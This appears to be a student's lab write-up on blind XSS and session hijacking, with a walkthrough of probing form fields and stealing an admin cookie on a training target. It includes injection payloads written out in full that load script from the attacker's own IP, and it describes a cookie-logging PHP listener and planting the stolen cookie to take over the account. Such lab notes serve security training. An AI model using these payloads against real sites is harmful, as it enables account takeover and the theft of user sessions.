---
title: Session Hijacking
updated: 2023-08-21T10:34:36.0000000+01:00
created: 2023-08-20T17:46:34.0000000+01:00
date modified: Monday, May 13th 2024, 10:57:24 pm
---

Introduction:

Modern web applications use **cookies** to manage a user's session throughout different browsing sessions - this is what enables users to log in once and maintain the log-in session even if they close the tab.

However, malicious actors can obtain cookie data from the victim's browser and they can gain access to the user's active session and potentially take over the account by using JavaScript - this is **a Session Hijacking/Cookie stealing** attack.

Blind XSS Detection:

We usually start engagements by trying to discover the existence of XSS vulnerabilities. In this case we have a **Blind XSS vulnerability**. Meaning that the XSS is triggered on a page we cannot access or see - hence the name. Blind XSS usually occurs on forms such as:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent Headers

We can take for example a user registration portal:
![image1](../../../../_resources/image1-196.png)

After we register we can see:
![image2](../../../../_resources/image2-162.png)

This indicates that we won't be able to see how our input will be handled or how it will appear in the browser. In regular XSS attacks we can use the alert box payload to check for XSS - but since we can't see the admin panel, **How do we detect if the application is vulnerable to XSS?**

To do this, we need to use a JavaScript payload which will send a HTTP request back to us - if it succeeds, then we have a **Blind XSS** vulnerability, if it fails we do not.

There are two main issues with this approach though:

1.  **How can we know which specific field is vulnerable?**
    1.  Since any fields can execute code how do we know which one does execute code?
2.  **How can we know what XSS payload to use?**
    1.  The page is vulnerable, but certain payloads might not work.

Using a Targets Cookie:

Once we get the cookie from a target, we can log in using the login page, we do this by using **browser dev tools** and adding a cookie to storage that corresponds to our user:
![image3](../../../../_resources/image3-127.png)

And once we refresh the page we will be logged in as the user:
![image4](../../../../_resources/image4-102.png)

Activity:
![image5](../../../../_resources/image5-78.png)

1.  Find working XSS payload
    1.  Use netcat or php listener and look for responses.
    2.  Send XSS payloads to the web app.
2.  Inject our code to steal the victims cookie
    1.  Start our PHP script to get the targets cookie
3.  Use dev tools to edit our cookie to log in as them.

Starting our php listener:
![image6](../../../../_resources/image6-55.png)

When we submit a login form:
<http://10.129.35.174/hijacking/?fullname=a&username=s&password=s&email=a%40a.com&imgurl=a>

To test all the fields to determine if they are vulnerable:
(Note that we should test these variation since we don't know what the source code will accept)
\<script src=http://10.10.16.31:80\>\</script\>
'\>\<script src=http://10.10.16.31:80\>\</script\>

We send this via the form in the browser - omitting the email field.

**"\>\<script src=http://10.10.16.31:80\>\</script\> - Gives us a response, showing us that blind XSS is possible:**
![image7](../../../../_resources/image7-48.png)

Now we need to test each field to figure out where the XSS vulnerability is. e.g.

**"\>\<script src=http://10.10.16.31:80/fullname\>\</script\>**
**"\>\<script src=http://10.10.16.31:80/username\>\</script\>**
**"\>\<script src=http://10.10.16.31:80/password\>\</script\>**
**"\>\<script src=http://10.10.16.31:80/url\>\</script\>**

We then can look at our listener and see that it is the URL field:
![image8](../../../../_resources/image8-41.png)

*Note that we could also use BURP or a python script that uses curl to automate this if we wanted to.*

2.  Injecting our code

We have our JS payload from PayloadAllTheThings - we need to write this as **script.js** inside our listener directory:
![image9](../../../../_resources/image9-34.png)

We then can setup our PHP script to get cookies - we need to write this as **index.php** inside our listener directory:
![image10](../../../../_resources/image10-28.png)

Restart the PHP listener:
![image11](../../../../_resources/image11-22.png)

And send our payload:
**"\>\<script src=http://10.10.16.31:80/script.js\>\</script\>**

In our listener:
![image12](../../../../_resources/image12-17.png)
Loading a remote script:

In, HTML we are able to write our own JS code using script tags, we can also include a remote script for our IP like so:
![image13](../../../../_resources/image13-16.png)

**To check blind XSS,** we can change the name of the **script.js** to the field we want to test - if we get a response then the resource exists, testing **username** for example:
![image14](../../../../_resources/image14-13.png)

Then with this information, it is possible to send various XSS payloads that load a remote script and see what gives us a request back:
![image15](../../../../_resources/image15-10.png)

*Note that the reason why we have script tags that start with speech marks is to try test for various exploits that effect the backend.*

If we had access to the source code, we could write a payload that would be successfully injected without all of this formatting, this is why **DOM XSS** in which we can see the source code via the client side is more successful with **Blind XSS.**

Before we start to send payloads we need to start a listener on our VM, either using **netcat** or **PHP:**
![image16](../../../../_resources/image16-10.png)

Then we can start to test the payloads using our IP and looking for responses in our listener:
![image17](../../../../_resources/image17-8.png)

*Note that we usually shouldn't test passwords since they are hashed, in this case the email field is needs to be a valid email and is validated in the back-end - even if using the HTTP parameter method.*

Once we submit the form, we wait a few seconds and check our listeners in the terminal. When we see a response we should note down what payload we used.

Session Hijacking:

Once we have a working XSS payload we can then use it to exploit a target using a **Session Hijacking Attack**. To do this we use JavaScript to send us the data using a PHP script hosted on our server.

We can use payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc), to do this:
![image18](../../../../_resources/image18-8.png)

The 2nd payload is the one we will use since it just adds an image to our page, which doesn't look malicious. **We will need to write this to a script.js file on our machine too.**

Finally, we can change the URL in the XSS payload to point to our IP:
![image19](../../../../_resources/image19-6.png)
(making sure we include these in our scripts too).

With our PHP script now running, we can use the code portion of our XSS attack and send it the vulnerable input field. However, we can get many cookies so it is important that we spilt them with a newline and write to file in the event we get lots of cookies.

PHP script **(index.php in our php listener folder**):
![image20](../../../../_resources/image20-5.png)

Once a victim visits our malicious page, we will get two requests in our listener:
![image21](../../../../_resources/image21-5.png)

We can then cat our cookie file:
![image22](../../../../_resources/image22-5.png)

Logging in as admin:

Finally after sending our payload we have gotten the admin cookie, we can log in as our admin using devtools.
![image23](../../../../_resources/image23-4.png)

We navigate to login.php and open up **Storage** so we can add a new cookie:
![image24](../../../../_resources/image24-4.png)

We then edit this value to include the admins **cookie name** and **cookie value:**
![image25](../../../../_resources/image25-4.png)

Then we have access to the admin panel:
![image26](../../../../_resources/image26-3.png)

